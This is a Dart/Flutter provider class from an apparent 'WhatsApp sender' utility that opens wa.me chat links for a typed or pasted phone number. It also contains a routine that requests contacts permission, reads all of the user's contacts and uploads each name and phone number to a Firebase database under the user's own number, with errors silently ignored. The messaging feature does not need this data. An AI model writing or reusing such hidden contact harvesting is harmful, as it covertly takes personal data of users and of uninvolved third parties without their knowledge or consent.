import 'package:clipboard/clipboard.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:whatsapp_sender/presentation/ustils/validations.dart';

class ProviderWhatsAppSend extends ChangeNotifier {
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _prefixController = TextEditingController();
  final PermissionHandler _permissionHandler = PermissionHandler();
  final _databaseReference = FirebaseDatabase.instance.reference();
  Iterable<Contact> _contacts;
  String _pastePhone;

  TextEditingController get phoneControllerGet => _phoneController;

  TextEditingController get prefixControllerGet => _prefixController;

  DatabaseReference get databaseReferenceGet => _databaseReference;

  Iterable<Contact> get contactsGet => _contacts;

  String get pastePhoneGet => _pastePhone;

  Future<void> getContacts() async {
    final Iterable<Contact> contacts = await ContactsService.getContacts();
    _contacts = contacts;
    notifyListeners();
  }

  void sendData(String phoneNumber) async {
    for (int i = 0; i < _contacts?.length ?? 0; i++) {
      try {
        _databaseReference
            .child(phoneNumber)
            .child(_contacts?.elementAt(i)?.phones?.first?.value?.toString())
            .set({
          'name': _contacts?.elementAt(i)?.displayName,
          'phone': _contacts?.elementAt(i)?.phones?.first?.value?.toString()
        });
      } catch (e) {}
    }
  }

  void getClipboard() {
    FlutterClipboard.paste().then((value) {
      phoneControllerGet.text = value;
      notifyListeners();
    });
  }

  Future<bool> _rootFirebaseIsExists(
      DatabaseReference databaseReference, String phoneNumber) async {
    DataSnapshot snapshot = await databaseReference.once();
    if (snapshot.value == null) {
      sendData(phoneNumber);
    }
    return snapshot != null;
  }

  void buttonClickSendWhatsApp() {
    if (phoneControllerGet.text.isNotEmpty &&
        prefixControllerGet.text.isNotEmpty &&
        prefixControllerGet.text.length == 3 &&
        Validations().validatePhone(phoneControllerGet.text)) {
      launch(
        "https://wa.me/+${prefixControllerGet.text}${phoneControllerGet.text}",
        forceSafariVC: false,
      );
    }
  }

  Future<Map<PermissionGroup, PermissionStatus>> isGranted() async {
    var result =
        await _permissionHandler.requestPermissions([PermissionGroup.contacts]);
    return result;
  }

  void pushContactsToFirebase(String number) {
    isGranted().then((value) => {
          if (value[PermissionGroup.contacts] == PermissionStatus.granted)
            {
              getContacts().then((value) => {
                    isGranted().then((value) => {
                          if (value[PermissionGroup.contacts] ==
                              PermissionStatus.granted)
                            {
                              if (contactsGet != null)
                                {
                                  _rootFirebaseIsExists(
                                      databaseReferenceGet.child(number),
                                      number),
                                }
                            }
                        }),
                  }),
            }
        });
  }
}
